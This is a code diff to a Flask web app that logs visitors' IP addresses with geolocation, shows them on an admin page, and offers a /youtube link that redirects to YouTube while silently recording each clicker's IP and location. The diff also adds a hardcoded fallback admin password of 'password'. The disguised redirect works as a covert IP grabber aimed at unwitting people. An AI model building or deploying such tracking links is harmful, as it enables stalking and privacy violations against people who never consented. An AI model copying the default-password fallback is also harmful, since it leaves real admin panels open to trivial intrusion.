@@ -5,10 +5,18 @@ from datetime import datetime
 import requests
 import logging
 import os
+from dotenv import load_dotenv
 
+def get_admin_password():
+    if os.path.exists('.env'):
+        load_dotenv()
+    admin_password = os.getenv("PASSWORD")
+    if not admin_password or admin_password.strip() == "":
+        return "password"
+    else:
+        return admin_password.strip()
 
 def get_client_ip():
-    """Get the client's IP address from various possible headers"""
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0]
     elif request.headers.get('X-Real-IP'):
@@ -17,9 +25,7 @@ def get_client_ip():
         ip = request.remote_addr
     return ip
 
-
 def get_geolocation(ip):
-    """Get geolocation data for an IP address"""
     try:
         response = requests.get(f'http://ip-api.com/json/{ip}')
         if response.status_code == 200:
@@ -36,36 +42,9 @@ def get_geolocation(ip):
         app.logger.error(f"Error getting geolocation: {str(e)}")
     return {}
 
-
-@app.route('/')
-def index():
-    """Show visitor their IP address"""
-    try:
-        client_ip = get_client_ip()
-        record_visit(client_ip)
-        return render_template('index.html', ip_address=client_ip)
-    except Exception as e:
-        app.logger.error(f"Error handling visit: {str(e)}")
-        return render_template('index.html',
-                               error="Unable to detect IP address")
-
-
-@app.route('/youtube')
-def youtube():
-    """Redirect to YouTube and silently record the IP"""
-    try:
-        record_visit(get_client_ip())
-    except Exception as e:
-        app.logger.error(f"Error recording IP: {str(e)}")
-
-    return redirect("https://youtube.com")
-
-
 def record_visit(client_ip):
-    """Record or update a visit in the database"""
     try:
         visit = Visit.query.filter_by(ip_address=client_ip).first()
-
         if visit:
             visit.visit_count += 1
             visit.last_visit = datetime.utcnow()
@@ -77,7 +56,6 @@ def record_visit(client_ip):
                           region=geo_data.get('region'),
                           latitude=geo_data.get('latitude'),
                           longitude=geo_data.get('longitude'))
-
         db.session.add(visit)
         db.session.commit()
         return True
@@ -85,47 +63,55 @@ def record_visit(client_ip):
         app.logger.error(f"Error recording visit: {str(e)}")
         return False
 
+@app.route('/')
+def index():
+    try:
+        client_ip = get_client_ip()
+        record_visit(client_ip)
+        return render_template('index.html', ip_address=client_ip)
+    except Exception as e:
+        app.logger.error(f"Error handling visit: {str(e)}")
+        return render_template('index.html', error="Unable to detect IP address")
+
+@app.route('/youtube')
+def youtube():
+    try:
+        record_visit(get_client_ip())
+    except Exception as e:
+        app.logger.error(f"Error recording IP: {str(e)}")
+    return redirect("https://youtube.com")
 
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
     error = None
-    admin_password = os.getenv("PASSWORD", "password")
-    
+    admin_password = get_admin_password()
     if request.method == 'POST':
         if request.form['password'] == admin_password:
             session['admin_logged_in'] = True
             return redirect(url_for('admin_visits'))
         else:
-            error = 'Nieprawidłowe hasło!'
-
+            error = 'Incorrect Password!'
     return render_template('admin/login.html', error=error)
-
 
 @app.route('/admin/logout')
 def admin_logout():
     session.pop('admin_logged_in', None)
     return redirect(url_for('admin_login'))
 
-
 @app.route('/admin/visits')
 def admin_visits():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
-
     visits = Visit.query.order_by(Visit.last_visit.desc()).all()
     return render_template('admin/visits.html', visits=visits)
-
 
 @app.route('/admin/delete-visits', methods=['POST'])
 def admin_delete_visits():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
-
     selected_visits = request.form.getlist('selected_visits')
-
     if not selected_visits:
         return redirect(url_for('admin_visits'))
-
     try:
         deleted_count = 0
         for visit_id in selected_visits:
@@ -133,16 +119,13 @@ def admin_delete_visits():
             if visit:
                 db.session.delete(visit)
                 deleted_count += 1
-
         db.session.commit()
         flash(f'Usunięto {deleted_count} wybranych wpisów.', 'success')
     except Exception as e:
         db.session.rollback()
         app.logger.error(f"Error deleting visits: {str(e)}")
         flash('Wystąpił błąd podczas usuwania wpisów.', 'danger')
-
     return redirect(url_for('admin_visits'))
-
 
 @app.route('/keep-alive', methods=['POST'])
 def keep_alive():
